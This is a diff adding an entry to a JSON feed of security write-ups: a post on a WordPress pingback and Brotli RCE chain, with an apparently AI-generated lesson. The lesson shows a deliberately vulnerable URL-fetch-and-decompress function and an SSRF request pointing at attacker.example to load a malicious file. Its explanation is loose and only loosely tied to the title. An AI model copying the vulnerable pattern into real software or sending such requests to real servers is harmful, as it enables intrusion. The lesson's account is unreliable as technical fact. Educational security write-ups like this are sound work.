@@ -1,5 +1,46 @@
 [
   {
+    "id": "4766beb664c4",
+    "title": "WordPress pingback and Brotli RCE",
+    "url": "https://www.reddit.com/r/netsec/comments/1xlsgc8/wordpress_pingback_and_brotli_rce",
+    "source": {
+      "slug": "reddit-netsec",
+      "name": "r/netsec"
+    },
+    "authors": [
+      "/u/adrian_rt"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-11-02T09:11:50.000Z",
+    "added_at": "2026-11-02T10:06:08.277Z",
+    "categories": [
+      "rce",
+      "ssrf"
+    ],
+    "severity": "critical",
+    "difficulty": "advanced",
+    "summary_en": "A critical vulnerability chain where WordPress pingbacks are leveraged alongside Brotli decompression flaws to achieve Remote Code Execution (RCE).",
+    "summary_ar": null,
+    "lesson": {
+      "cause": null,
+      "walkthrough": null,
+      "example": "We assume a server takes a URL from a user and tries to decompress the content found there. \n\nVulnerable Code Snippet:\nimport requests\nimport brotli\ndef download_and_extract(user_url):\n    # The server fetches the URL provided by the user\n    file_data = requests.get(user_url).content \n    # The server tries to decompress the data using the Brotli library\n    return brotli.decompress(file_data)\n\nAttack Request:\nGET /extract?url=http://attacker.example/malicious.br HTTP/1.1\nHost: target.example\n\nWhy it works:\n1. The server performs an SSRF (Server-Side Request Forgery: a vulnerability where a server is tricked into making a request to a location chosen by the attacker).\n2. The attacker provides a URL pointing to a 'malicious.br' file.\n3. When the server runs 'brotli.decompress' on this file, a bug in the Brotli library (a tool used to make files smaller) is triggered.\n4. This bug allows the attacker to overwrite the server's memory and execute their own commands, known as RCE (Remote Code Execution: the most dangerous type of bug where an attacker takes full control of the system).",
+      "takeaway": null,
+      "fix": null,
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": null,
+    "ai_generated": true,
+    "engagement": null,
+    "score": 60
+  },
+  {
     "id": "7cef5a9d64c5",
     "title": "How I Found SSRF in 6 Known Companies Using One Methodology in 2026",
     "url": "https://medium.com/@shawkat7h/how-i-found-ssrf-in-6-known-companies-using-one-methodology-in-2026-987d79b27620",
